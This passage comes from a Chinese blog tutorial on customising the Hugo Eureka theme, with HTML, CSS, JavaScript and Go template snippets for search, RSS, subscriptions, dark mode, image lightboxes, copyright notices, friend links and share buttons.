\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;mr-6 my-2\u0026#34; style=\u0026#34;margin: 10px;\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;${item.permalink}#waline-comments\u0026#34; title=\u0026#34;${item.title}\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fas fa-comment mr-1\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;span\u0026gt;${item.comments \u0026gt; 0 ? item.comments + \u0026#39; 条评论\u0026#39; : \u0026#39;暂无评论\u0026#39;}\u0026lt;/span\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;mr-6 my-2\u0026#34; style=\u0026#34;margin: 10px;\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fa-solid fa-folder-open\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;span\u0026gt;${item.categories}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;mr-6 my-2\u0026#34; style=\u0026#34;margin: 10px;\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fa-solid fa-tags\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;span\u0026gt;\u0026lt;b\u0026gt;${item.tags}\u0026lt;/b\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;w-full lg:w-1/3 mb-4 lg:mb-0 lg:ml-8\u0026#34;\u0026gt; ${item.featuredImage ? `\u0026lt;img src=\u0026#34;${item.featuredImage}\u0026#34; class=\u0026#34;w-full\u0026#34; alt=\u0026#34;Featured Image\u0026#34;\u0026gt;` : \u0026#39;\u0026#39;} \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;`; }).join(\u0026#39;\u0026#39;); } function updateDOM(html, keyword, number) { document.title = document.title.replace(/包含关键词.*?文章/, `包含关键词 ${keyword} 的文章`) searchResult.innerHTML = html searchCount.innerHTML = `共查询到 ${number} 篇文章` } async function search(searchString) { console.log(searchString); let result = []; if(searchString) { const fuse = await getFuse() result = fuse.search(searchString) } const html = render(result) updateDOM(html, searchString, result.length) } document.querySelectorAll(\u0026#39;input[name=\u0026#34;q\u0026#34;]\u0026#39;).forEach(el =\u0026gt; el.value = qs.get(\u0026#39;q\u0026#39;)); search(qs.get(\u0026#39;q\u0026#39;) || \u0026#39;\u0026#39;) window.blogSearch = function(keyword) { if(!keyword) { return; } history.pushState(\u0026#39;\u0026#39;, \u0026#39;\u0026#39;, location.pathname + \u0026#39;?q=\u0026#39; + encodeURIComponent(keyword)); document.querySelectorAll(\u0026#39;input[name=\u0026#34;q\u0026#34;]\u0026#39;).forEach(el =\u0026gt; el.value = keyword); search(keyword); } }) \u0026lt;/script\u0026gt; {{ end }} 然后新建content/search.md填入：\n--- title: \u0026#34;搜索结果\u0026#34; sitemap: priority : 0.1 layout: \u0026#34;search\u0026#34; date: \u0026#34;2022-12-29T05:02:20+08:00\u0026#34; slug: \u0026#34;search.html\u0026#34; --- 来源：Hugo 主题 Eureka 自定义 | 怡红院落\n自定义RSS文件 请务必下载外部js代码！\n新建themes/eureka/layouts/_default/rss.xml，然后可以填入go模板，下面是一个示例：\n{{- $page_context := cond .IsHome site . -}} {{- $pages := $page_context.RegularPages -}} {{- $limit := site.Config.Services.RSS.Limit -}} {{- if ge $limit 1 -}} {{- $pages = $pages | first $limit -}} {{- end -}} {{- printf \u0026#34;\u0026lt;?xml version=\\\u0026#34;1.0\\\u0026#34; encoding=\\\u0026#34;utf-8\\\u0026#34; standalone=\\\u0026#34;yes\\\u0026#34; ?\u0026gt;\u0026#34; | safeHTML }} \u0026lt;rss version=\u0026#34;2.0\u0026#34; xmlns:atom=\u0026#34;http://www.w3.org/2005/Atom\u0026#34;\u0026gt; \u0026lt;channel\u0026gt; \u0026lt;title\u0026gt;{{ if ne .Title site.Title }}{{ with .Title }}{{.}} | {{ end }}{{end}}{{ site.Title }}\u0026lt;/title\u0026gt; \u0026lt;link\u0026gt;{{ .Permalink }}\u0026lt;/link\u0026gt; {{- with .OutputFormats.Get \u0026#34;RSS\u0026#34; }} {{ printf \u0026#34;\u0026lt;atom:link href=%q rel=\\\u0026#34;self\\\u0026#34; type=%q /\u0026gt;\u0026#34; .Permalink .MediaType | safeHTML }} {{ end -}} \u0026lt;description\u0026gt;{{ .Title | default site.Title }}\u0026lt;/description\u0026gt; \u0026lt;generator\u0026gt;Hugo -- gohugo.io AND \u0026lt;a href=\u0026#34;https://github.com/wangchucheng/hugo-eureka/\u0026#34;\u0026gt;Eureka\u0026lt;/a\u0026gt;\u0026lt;/generator\u0026gt; {{- with site.LanguageCode }}\u0026lt;language\u0026gt;{{.}}\u0026lt;/language\u0026gt;{{end -}} {{- with site.Copyright }}\u0026lt;copyright\u0026gt;{{ replace (replace . \u0026#34;{year}\u0026#34; now.Year) \u0026#34;\u0026amp;copy;\u0026#34; \u0026#34;©\u0026#34; | plainify }}\u0026lt;/copyright\u0026gt;{{end -}} {{- if not .Date.IsZero }}\u0026lt;lastBuildDate\u0026gt;{{ .Date.Format \u0026#34;Mon, 02 Jan 2006 15:04:05 -0700\u0026#34; | safeHTML }}\u0026lt;/lastBuildDate\u0026gt;{{ end -}} {{ range $pages }} \u0026lt;item\u0026gt; \u0026lt;title\u0026gt;{{ .Title }}\u0026lt;/title\u0026gt; \u0026lt;link\u0026gt;{{ .Permalink }}\u0026lt;/link\u0026gt; \u0026lt;pubDate\u0026gt;{{ .Date.Format \u0026#34;Mon, 02 Jan 2006 15:04:05 -0700\u0026#34; | safeHTML }}\u0026lt;/pubDate\u0026gt; \u0026lt;guid\u0026gt;{{ .Permalink }}\u0026lt;/guid\u0026gt; {{ with .Description }} \u0026lt;description\u0026gt;{{ . }}\u0026lt;/description\u0026gt; {{ else }} {{if .IsPage}} \u0026lt;description\u0026gt;{{ .Summary }}\u0026lt;/description\u0026gt; {{ else }} {{ with .Site.Params.Description }} \u0026lt;description\u0026gt;{{ . }}\u0026lt;/description\u0026gt; {{ end }} {{ end }} {{ end }} \u0026lt;/item\u0026gt; {{ end }} \u0026lt;/channel\u0026gt; \u0026lt;/rss\u0026gt; 增加订阅功能 请务必下载外部js代码！\n首先，此功能要求网站有一个RSS文件，一般会自动生成为index.xml\n法一：TinyLetter+Zapier 使用TinyLetter的获取订阅者服务+Zapier的自动发信服务，具体步骤详见Newsletter for Hugo Blog - Backendology - A study of backend web development by Jared Ririe\n注意，TinyLetter是免费的，但是Zapier似乎是付费的（有试用期）\n不建议使用TinyLetter，功能简陋，且搞自动化发邮件容易被系统ban掉\n法二：使用follow.it 我们还可以使用更自动化、更便捷的follow.it | Feedburner Alternative - Get more readers，有免费计划也有付费计划，付费计划价格也较低\n直接根据官网的指引走就好了，然后它就会自动解析你的RSS页面（前提是你要有RSS）中最近发表的文章，并将24小时内更新的文章以邮件形式发送给订阅者，同时它还有一个类似于展览一样的东西，读者可以直接从它的网站发现你的网站并进行订阅。\nfollow.it分两种发信方式，一种是NewsPaper，在每天的固定时间向订阅者推送消息或邮件；另一种是single email，会在检测到新文章后自动生成邮件发送\nfollow.it还自带RSS阅读器，这样我们的RSS页面可以变的更美观，但是不建议用这个页面代替我们的RSS页面，因为我们的RSS页面的信息可能被别的网站采集并获取最新消息，所以不建议换掉这个页面\nfollow.it的缺点是有时候对RSS的变化响应不够迅速，还有免费版功能比较简陋\n在博客内部某个地方添加订阅入口 记得在自己的博客内部增加一个进入订阅页面的入口，可以把订阅页面(https://tinyletter.com/\u0026lt;你的名字\u0026gt;)下载下来（可以自定义样式），放在themes/eureka/layouts/_default并重命名为subscribe.html，然后新建/content/subscribe/subscribe.md并填入frontmatter：\n--- layout: subscribe title: \u0026#34;订阅\u0026#34; date: 2023-01-07T17:06:54+08:00 draft: false slug: \u0026#34;subscribe\u0026#34; --- 然后在about页加一个小按钮：\n具体代码示例如下：\n\u0026lt;style\u0026gt; .button { font-family: 宋体,\u0026#39;Comic Sans MS\u0026#39;, cursive; color: #FFFFFF; background-color: #333333; display: inline-block; white-space: nowrap; height: 40px; line-height: 42px; margin: 0 5px 0 0; padding: 0 22px; text-decoration: none; /* text-transform: uppercase; */ text-align: center; font-weight: medium; font-style: normal; font-size: 14px; cursor: pointer; border: 0; -moz-border-radius: 4px; border-radius: 4px; -webkit-border-radius: 4px; vertical-align: top; -webkit-font-smoothing: antialiased; font-smoothing: antialiased; } \u0026lt;/style\u0026gt; \u0026lt;a href=\u0026#34;/subscribe/\u0026#34;\u0026gt;\u0026lt;button class=\u0026#34;button\u0026#34;\u0026gt;立即订阅个人博客\u0026lt;/button\u0026gt;\u0026lt;/a\u0026gt; 还可以在各种地方添加一个小铃铛图片，这样用户更容易找到你的订阅入口，而不用返回到主页\n让你的博客能被google等搜索引擎找到 google可以使用Google Search Console，详见让Google搜索到自己的博客\nbing可以使用Bing Webmaster Tools，详见如何讓你的 WordPress 網站能被 Bing 索引？ | 小翔教你SEO，注意bing是可以导入google search console的数据的，因此建议先设置google\n百度同理，使用普通收录_加快网站内容抓取，快速提交数据工具_站长工具_网站支持_百度搜索资源平台\n更多阅读：\nHexo 配置主流搜索引擎收录流程记录 | 乐园 使黑色图片在深色模式下反转为白色图片 下面提供一个示例。\n比如我在about.md中定义的头像是黑色透明背景的，在深色模式下就完全看不清图片：\n我们可以在themes/eureka/layouts/partials/widgets/about.html文件头部加上：\n\u0026lt;style\u0026gt; .dark .avatar{ filter: invert(100%); } \u0026lt;/style\u0026gt; 然后给alt=\u0026quot;Avatar\u0026quot;的img标签加上avatar类：\n效果：\n让深浅颜色变换更平滑 在themes/eureka/layouts/partials/head.html中增加：\n\u0026lt;style\u0026gt; .dark{ transition: 1.5s; } .light{ transition: 1.5s; } \u0026lt;/style\u0026gt; 然后因为eureka主题实现深浅变化是根据有没有dark类来区分的，所以没有light类，因此我们需要更改themes/eureka/layouts/_default/baseof.html中的html标签：\n\u0026lt;html lang=\u0026#34;{{ .Site.LanguageCode }}\u0026#34; dir=\u0026#34;{{ .Site.Language.LanguageDirection | default \u0026#34;ltr\u0026#34; }}\u0026#34; {{ if eq .Site.Params.colorScheme \u0026#34;dark\u0026#34; }}class=\u0026#34;dark\u0026#34; {{ else }} class=\u0026#34;light\u0026#34; {{ end }} \u0026gt; 这样在深浅主题变化的时候，颜色过渡就会平滑一点了，具体成果见我的博客\n增加回到开头按钮 在themes\\eureka\\layouts\\partials\\components\\post-article.html末尾增加：\n\u0026lt;style\u0026gt; .black-circle{ height: 45px; width: 45px; display: block; font-size: 30px; transition: all 1.5s; position:fixed; right:0px; bottom:0px; z-index: 100; background: transparent; } .black-circle:hover{ transform: translateY(-10px); } \u0026lt;/style\u0026gt; \u0026lt;script\u0026gt; function goTop(acceleration, time) { acceleration = acceleration || 0.1; time = time || 16; var x1 = 0; var y1 = 0; var x2 = 0; var y2 = 0; var x3 = 0; var y3 = 0; if (document.documentElement) { x1 = document.documentElement.scrollLeft || 0; y1 = document.documentElement.scrollTop || 0; } if (document.body) { x2 = document.body.scrollLeft || 0; y2 = document.body.scrollTop || 0; } var x3 = window.scrollX || 0; var y3 = window.scrollY || 0; // 滚动条到页面顶部的水平距离 var x = Math.max(x1, Math.max(x2, x3)); // 滚动条到页面顶部的垂直距离 var y = Math.max(y1, Math.max(y2, y3)); // 滚动距离 = 目前距离 / 速度, 因为距离原来越小, 速度是大于 1 的数, 所以滚动距离会越来越小 var speed = 1 + acceleration; window.scrollTo(Math.floor(x / speed), Math.floor(y / speed)); // 如果距离不为零, 继续调用迭代本函数 if(x \u0026gt; 0 || y \u0026gt; 0) { var invokeFunction = goTop( acceleration , time ); window.setTimeout(invokeFunction, time); } } \u0026lt;/script\u0026gt; \u0026lt;a\u0026gt;\u0026lt;i id=\u0026#34;return-top\u0026#34; class=\u0026#34;fa-solid fa-circle-up black-circle\u0026#34; onclick=\u0026#34;goTop(0.1, 16)\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026lt;/a\u0026gt; 感谢关于top按钮的网页设置 - zhunaoke - 博客园中提供的代码\n具体效果：\n增加图片放大查看功能 本部分灵感来自于Hugo 使用 Fancybox 实现图片灯箱/放大功能 - atpX，其作者灵感来自于maupassant-hugo/render-image.html at master · flysnow-org/maupassant-hugo · GitHub，但是该文作者的方法似乎有误，我更改了以后在我的页面上终于可以使用了\n在params.yaml添加：\nfancybox : true 或者在config.yaml添加：\nparams: fancybox : true 然后新建themes/eureka/layouts/_default/_markup/render-image.html（包括文件夹），添加代码：\n{{- $img_destination := .Destination -}} {{- if (and .Page.Site.Params.image_cdn.enable (not .Page.Site.IsServer)) -}} {{if hasPrefix .Destination \u0026#34;/\u0026#34; }} {{ $img_destination = (print .Page.Site.Params.image_cdn.HOST .Destination) }} {{ else if not (hasPrefix .Destination \u0026#34;http\u0026#34;) }} {{ $img_destination = (print .Page.Site.Params.image_cdn.HOST (path.Join .Page.RelPermalink .Destination)) }} {{ end }} {{- end -}} {{- if .Title -}} \u0026lt;figure class=\u0026#34;max-w-2xl mx-auto overflow-hidden\u0026#34;\u0026gt; {{if .Page.Site.Params.fancybox }} \u0026lt;a data-fancybox=\u0026#34;gallery\u0026#34; href=\u0026#34;{{ $img_destination | safeURL }}\u0026#34;\u0026gt; \u0026lt;img alt=\u0026#34;{{ $.Text }}\u0026#34; src=\u0026#34;{{ $img_destination | safeURL }}\u0026#34; /\u0026gt; \u0026lt;/a\u0026gt; {{ else }} \u0026lt;img alt=\u0026#34;{{ $.Text }}\u0026#34; src=\u0026#34;{{ $img_destination | safeURL }}\u0026#34; /\u0026gt; {{ end }} \u0026lt;figcaption class=\u0026#34;p-2 text-center\u0026#34;\u0026gt;{{ with $.Title | safeHTML }}{{ . }}{{ end }}\u0026lt;/figcaption\u0026gt; \u0026lt;/figure\u0026gt; {{- else -}} {{if .Page.Site.Params.fancybox }} \u0026lt;a data-fancybox=\u0026#34;gallery\u0026#34; href=\u0026#34;{{ $img_destination | safeURL }}\u0026#34;\u0026gt; \u0026lt;img class=\u0026#34;mx-auto\u0026#34; alt=\u0026#34;{{ $.Text }}\u0026#34; src=\u0026#34;{{ $img_destination | safeURL }}\u0026#34; /\u0026gt; \u0026lt;/a\u0026gt; {{ else }} \u0026lt;img class=\u0026#34;mx-auto\u0026#34; alt=\u0026#34;{{ $.Text }}\u0026#34; src=\u0026#34;{{ $img_destination | safeURL }}\u0026#34; /\u0026gt; {{ end }} {{- end -}} ✍️ps.该代码与maupassant-hugo/render-image.html at master · flysnow-org/maupassant-hugo · GitHub的代码一致\n在themes/eureka/layouts/partials/custom-head.html增加（也可以在同目录下的head.html或footer.html增加）以下代码：\n{{if .Page.Site.Params.fancybox }} \u0026lt;script src=\u0026#34;https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css\u0026#34; /\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; {{ end }} 以后如果不想要图片放大功能了，只用更改fancybox的值就可以了\n在文章开头增加版权声明 我们希望在自己原创的文章开头放一个版权声明，但是在自己转载的文章开头又不放，我们可以在themes/eureka/layouts/partials/components/post-article.html内的{{ .Content }}上方加上：\n{{ if (or (not .Params.reprint) ( not ( in \u0026#34;true\u0026#34; .Params.reprint )) ) }} \u0026lt;b\u0026gt;\u0026lt;p\u0026gt;⚠️本文是\u0026lt;a href=\u0026#34;https://github.com/PeterLiu-all\u0026#34;\u0026gt;作者P3troL1er\u0026lt;/a\u0026gt;原创，首发于\u0026lt;a href=\u0026#34;{{ .Permalink }}\u0026#34;\u0026gt;{{ .Site.BaseURL }}\u0026lt;/a\u0026gt;。商业转载请联系作者获得授权，非商业转载请注明出处！\u0026lt;/p\u0026gt;\u0026lt;/b\u0026gt; {{ end }} 复制内容自动增加版权信息 我们希望所有复制的文字和html都在末尾附上版权信息还有自己网站的链接，但是按copy按钮复制的代码却不希望加上信息（这样会很麻烦），于是我更改了复制网页内容自动添加版权信息的方法_idjl的博客-CSDN博客的代码，在themes/eureka/layouts/partials/custom-head.html末尾加上：\n\u0026lt;script language=\u0026#34;javascript\u0026#34;\u0026gt; function setClipboardText(event) { event.preventDefault();//阻止元素发生默认的行为（例如，当点击提交按钮时阻止对表单的提交）。 var node = document.createElement(\u0026#39;div\u0026#39;); //对documentfragment不熟，不知道怎么获取里面的内容，用了一个比较笨的方式 node.appendChild(window.getSelection().getRangeAt(0).cloneContents()); //getRangeAt(0)返回对基于零的数字索引与传递参数匹配的选择对象中的范围的引用。对于连续选择，参数应为零。 var htmlData = \u0026#34;\u0026lt;div\u0026gt;\u0026#34; + node.innerHTML + \u0026#34;\u0026lt;br /\u0026gt;\u0026lt;br /\u0026gt;著作权归作者P3troL1er所有。\u0026lt;br /\u0026gt;\u0026#34; + \u0026#34;商业转载请联系作者P3troL1er获得授权，非商业转载请注明出处。\u0026lt;br /\u0026gt;\u0026#34; + \u0026#39;作者：P3troL1er\u0026lt;br /\u0026gt;链接：\u0026lt;a href=\u0026#34;https://peterliuzhi.top/\u0026#34;\u0026gt;https://peterliuzhi.top/\u0026lt;/a\u0026gt;\u0026lt;br /\u0026gt;\u0026#39; + \u0026#34;\u0026lt;/div\u0026gt;\u0026#34;; var textData = \u0026#34;\u0026#34; if (window.getSelection().anchorNode.parentElement.className == \u0026#34;highlight\u0026#34;) textData = window.getSelection().getRangeAt(0) else textData = window.getSelection().getRangeAt(0) + \u0026#34;\\n\\n著作权归作者所有。\\n\u0026#34; + \u0026#34;商业转载请联系作者获得授权，非商业转载请注明出处。\\n\u0026#34; + \u0026#34;作者：P3troL1er\\n链接：https://peterliuzhi.top/\\n\u0026#34;; if (event.clipboardData) { event.clipboardData.setData(\u0026#34;text/html\u0026#34;, htmlData); //setData(剪贴板格式, 数据) 给剪贴板赋予指定格式的数据。返回 true 表示操作成功。 event.clipboardData.setData(\u0026#34;text/plain\u0026#34;, textData); } else if (window.clipboardData) { //window.clipboardData的作用是在页面上将需要的东西复制到剪贴板上，提供了对于预定义的剪贴板格式的访问，以便在编辑操作中使用。 return window.clipboardData.setData(\u0026#34;text\u0026#34;, textData); } } document.addEventListener(\u0026#34;copy\u0026#34;, function (e) { setClipboardText(e); }); \u0026lt;/script\u0026gt; 增加友链页面 新建layouts/shortcodes/friend.html（包括文件夹），写入：\n{{- if .IsNamedParams -}} \u0026lt;a target=\u0026#34;_blank\u0026#34; href={{ .Get \u0026#34;url\u0026#34; }} title={{ .Get \u0026#34;name\u0026#34; }} class=\u0026#34;friendurl\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;frienddiv\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;frienddivleft\u0026#34;\u0026gt; \u0026lt;img class=\u0026#34;myfriend\u0026#34; src={{ .Get \u0026#34;logo\u0026#34; }} /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;frienddivright\u0026#34;\u0026gt; \u0026lt;b\u0026gt; \u0026lt;div class=\u0026#34;friendname\u0026#34;\u0026gt;{{- .Get \u0026#34;name\u0026#34; -}}\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;friendinfo\u0026#34;\u0026gt;{{- .Get \u0026#34;word\u0026#34; -}}\u0026lt;/div\u0026gt; \u0026lt;/b\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/a\u0026gt; {{- end }} 然后新建content/friend/links.md写入：\n--- title: Links reprint: true date: 2023-01-19T21:51:25+08:00 --- \u0026lt;style\u0026gt; .friendurl { text-decoration: none !important; color: black; box-shadow: none !important; } .myfriend { width: 56px !important; height: 56px !important; border-radius: 50%!important; padding: 2px; margin-top: 20px !important; margin-left: 14px !important; background-color: transparent; } .frienddiv { overflow: auto; height: 100px; width: 49%; display: inline-block !important; border-radius: 5px; border-width: 0 !important; border-color: transparent !important; -moz-box-shadow: 0 1px 6px rgba(0, 0, 0, .12); -webkit-box-shadow: 0 1px 6px rgba(0, 0, 0, .12); box-shadow: 0 1px 6px rgba(0, 0, 0, .12); background: none; overflow:hidden; -webkit-transition: all ease-out 1s; -moz-transition: all ease-out 1s; -o-transition: all ease-out 1s; transition: all ease-out 1s; } .dark .frienddiv{ -moz-box-shadow: 0 1px 6px rgba(255, 255, 255, 0.12) !important; -webkit-box-shadow: 0 1px 6px rgba(255, 255, 255, 0.12) !important; box-shadow: 0 1px 6px rgba(255, 255, 255, 0.12) !important; } .dark .frienddiv:hover { background: var(--code-bg); } .frienddiv:hover { background: var(--theme); transition: transform 1s; webkit-transform: scale(1.1); -moz-transform: scale(1.2); -ms-transform: scale(1.2); -o-transform: scale(1.2); transform: scale(1.1); } .frienddiv:hover .frienddivleft img { transition: 0.9s !important; -webkit-transition: 0.9s !important; -moz-transition: 0.9s !important; -o-transition: 0.9s !important; -ms-transition: 0.9s !important; transform: rotate(360deg) !important; -webkit-transform: rotate(360deg) !important; -moz-transform: rotate(360deg) !important; -o-transform: rotate(360deg) !important; -ms-transform: rotate(360deg) !important; } .frienddivleft { width: 92px; float: left; margin-right: -5px; } .frienddivright { margin-top: 18px; margin-right: 18px; } .friendname { text-overflow: ellipsis; } .dark .friendname,.dark .friendinfo{ color: white; } .friendinfo { text-overflow: ellipsis; } @media screen and (max-width: 600px) { .friendinfo { display: none; } .frienddivleft { width: 84px; margin: auto; } .frienddivright { height: 100%; margin: auto; display: flex; align-items: center; justify-content: center; } .friendname { font-size: 18px; } } \u0026lt;/style\u0026gt; \u0026lt;!-- 记得把\u0026#34;\\\u0026#34;删掉，因为hugo的shortcode的原因不能直接打两个{ --\u0026gt; \\{\\{\u0026lt; friend name=\u0026#34;P3troL1er的博客\u0026#34; url=\u0026#34;https://peterliuzhi.top/\u0026#34; logo=\u0026#34;https://peterliuzhi.top/images/avatar.png\u0026#34; word=\u0026#34;P3troL1er的博客\u0026#34; \u0026gt;\\}\\} \u0026lt;br\u0026gt;\u0026lt;hr\u0026gt; 顺便一提，记得给友链页面设置入口，可以在menus.yaml设置：\nmain: - name: Friends url: /friend/links/ weight: 6 感谢Hugo博客添加友链 - 腾讯云开发者社区-腾讯云中提供的代码\n添加博客生存时间计数 最近看到hexo博客的一个主题有一个很棒的功能，仔细研究后发现是纯由js实现的，就打算给它嫖过来（\n我们在themes/eureka/layouts/partials/footer.html中原本的底部记录信息下面添加一句html\n添加：\n\u0026lt;p class=\u0026#34;text-sm text-tertiary-text\u0026#34;\u0026gt;本博客有\u0026lt;span id=\u0026#34;since\u0026#34; style=\u0026#34;color: var(--color-eureka);\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt;天的历史\u0026lt;/p\u0026gt; 然后在这个元素的下面（注意，位置要在它下面）添加一个script：\n\u0026lt;script\u0026gt; function show_date_time () { // 填入你的博客的诞生日期，格式为 月/日/年 时/分/秒 var BirthDay = new Date(\u0026#34;10/26/2022 0:00:00\u0026#34;); var today = new Date(); var timeold = (today.getTime() - BirthDay.getTime()); var msPerDay = 24 * 60 * 60 * 1000 var day = Math.floor(timeold / msPerDay) since.innerHTML = day } show_date_time() \u0026lt;/script\u0026gt; 改一下你的博客的诞生日期就可以啦，这个脚本会根据用户打开网页的时间实时更新生存时间，效果如下：\n使文章的导航栏可滚动 因为Eureka的文章导航栏是不可滚动的，要等到文章读到那一部分才能滚动到那里，非常不方便\n要使它能够优雅的滚动（让难看的滚动条不可见），可以在themes/eureka/layouts/partials/head.html加上一段CSS代码：\n\u0026lt;style\u0026gt; div#nav{ position: fixed; padding-bottom: 5vh; padding-right: 2vh; height:70vh; top: 20vh; width: fit-content; overflow-y: auto; -webkit-transition: all 1s cubic-bezier(0.02, 0.01, 0.47, 1); transition: all 1s cubic-bezier(.02, .01, .47, 1); } div#nav:hover{ box-shadow: 0 0px 32px 0 rgba(48, 55, 66, 0.073); } div#nav::-webkit-scrollbar { display: none !important; } \u0026lt;/style\u0026gt; 然后更改themes/eureka/layouts/partials/components/post-toc.html为：\n\u0026lt;div class=\u0026#34;sticky-toc\u0026#34; id=\u0026#34;nav\u0026#34; \u0026gt; \u0026lt;b\u0026gt;\u0026lt;h2 style=\u0026#34;font-size: larger;\u0026#34;\u0026gt;{{ i18n \u0026#34;onThisPage\u0026#34; }}\u0026lt;/h2\u0026gt;\u0026lt;/b\u0026gt; {{ .TableOfContents }} \u0026lt;/div\u0026gt; 效果如下：\n增加分享二维码和邀请信息 效果如下：\n在themes/eureka/layouts/partials/components/post-article.html的\u0026lt;/article\u0026gt;前面加上下面的代码：\n\u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; //显示图片 function displayImg(trans) { var img = document.getElementById(\u0026#34;qrcode\u0026#34;); var x = event.clientX + document.body.scrollLeft + 20 - trans; var y = event.clientY + document.body.scrollTop - 5 - trans; img.style.left = x + \u0026#34;px\u0026#34;; img.style.top = y + \u0026#34;px\u0026#34;; img.style.display = \u0026#34;block\u0026#34;; } //图片消失 function vanishImg(){ var img = document.getElementById(\u0026#34;qrcode\u0026#34;); img.style.display = \u0026#34;none\u0026#34;; } function flashCopyMessage(el, msg) { el.textContent = msg; setTimeout(function () { el.textContent = \u0026#34;点此复制分享信息！\u0026#34;; }, 1000); } function basic_copy(){ let message = \u0026#34;在吗？有篇博文写的挺好的，标题是 {{ .Title }} ，值得一读👍\\n详情点击{{ .Permalink }}\\n\u0026#34; + \u0026#34;\\n\\n著作权归作者所有。\\n\u0026#34; + \u0026#34;商业转载请联系作者获得授权，非商业转载请注明出处。\\n\u0026#34; + \u0026#34;作者：P3troL1er\\n链接：https://peterliuzhi.top/\\n\u0026#34;; navigator.clipboard.writeText(message); } function copy_invite_message(){ const msgbtn = document.querySelector(\u0026#34;#copy_invite_msg\u0026#34;); let message = \u0026#34;在吗？有篇博文写的挺好的，标题是 {{ .Title }} ，值得一读👍\\n详情点击{{ .Permalink }}\\n\u0026#34; + \u0026#34;\\n\\n著作权归作者所有。\\n\u0026#34; + \u0026#34;商业转载请联系作者获得授权，非商业转载请注明出处。\\n\u0026#34; + \u0026#34;作者：P3troL1er\\n链接：https://peterliuzhi.top/\\n\u0026#34;; navigator.clipboard.writeText(message) .then( () =\u0026gt; { flashCopyMessage(msgbtn, \u0026#34;已复制分享信息！\u0026#34;); console.log(\u0026#34;Copied to clipboard successfully!\u0026#34;); }, () =\u0026gt; { flashCopyMessage(msgbtn, \u0026#34;复制分享信息失败:(\u0026#34;); console.error(\u0026#34;Unable to write to clipboard.\u0026#34;); } ); } \u0026lt;/script\u0026gt; \u0026lt;button id=\u0026#34;copy_qrcode\u0026#34; class=\u0026#34;button\u0026#34; onmouseover=\u0026#34;displayImg(0);\u0026#34; onmouseout=\u0026#34;vanishImg()\u0026#34; onmousemove=\u0026#34;displayImg(0);\u0026#34;\u0026gt;点此复制分享二维码！\u0026lt;/button\u0026gt; \u0026lt;button id=\u0026#34;copy_invite_msg\u0026#34; class=\u0026#34;button\u0026#34; onclick=\u0026#34;copy_invite_message();\u0026#34;\u0026gt;点此复制分享信息！\u0026lt;/button\u0026gt; \u0026lt;a\u0026gt;\u0026lt;i id=\u0026#34;invite_icon\u0026#34; class=\u0026#34;fa-solid fa-share invite_icon\u0026#34; onmouseover=\u0026#34;displayImg(330);\u0026#34; onmouseout=\u0026#34;vanishImg()\u0026#34; onmousemove=\u0026#34;displayImg(330);\u0026#34; onclick=\u0026#34;basic_copy();\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;/subscribe/\u0026#34;\u0026gt;\u0026lt;i class=\u0026#34;fa-solid fa-bell ld sub_icon\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;div id=\u0026#34;qrcode\u0026#34; style=\u0026#34;width: 300px;height: 300px;display:none;position: fixed;\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;https://api.qrserver.com/v1/create-qr-code?data={{ .Permalink }}\u0026amp;size=300x300\u0026#34; alt=\u0026#34;生成二维码失败！检查检查网络？\u0026#34; style=\u0026#34;background-color: rgba(255, 255, 255, 0.904); margin:0;\u0026#34; id=\u0026#34;qrcode_img\u0026#34;\u0026gt; \u0026lt;div style=\u0026#34;width: 300px;height: fit-content; background-color: rgba(255, 255, 255, 0.582);\u0026#34;\u0026gt; \u0026lt;h3 style=\u0026#34;text-align: center; margin:0;\u0026#34;\u0026gt;扫码阅读此文章 \u0026lt;br /\u0026gt; 点击按钮复制分享信息\u0026lt;/h2\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; const testImg = document.querySelector(\u0026#34;#qrcode_img\u0026#34;); const btn = document.querySelector(\u0026#34;#copy_qrcode\u0026#34;); function flashCopyMessage(el, msg) { el.textContent = msg; setTimeout(function () { el.textContent = \u0026#34;点此复制分享二维码！\u0026#34;; }, 1000); } function handleCopyImg() { const canvas = document.createElement(\u0026#39;canvas\u0026#39;); const ctx = canvas.getContext(\u0026#39;2d\u0026#39;); ctx.fillStyle = \u0026#39;rgba(255, 255, 255, 0)\u0026#39;; const img = new Image(); canvas.width = testImg.width; canvas.height = testImg.height; img.crossOrigin = \u0026#34;Anonymous\u0026#34;; img.src = testImg.src; img.onload = () =\u0026gt; { 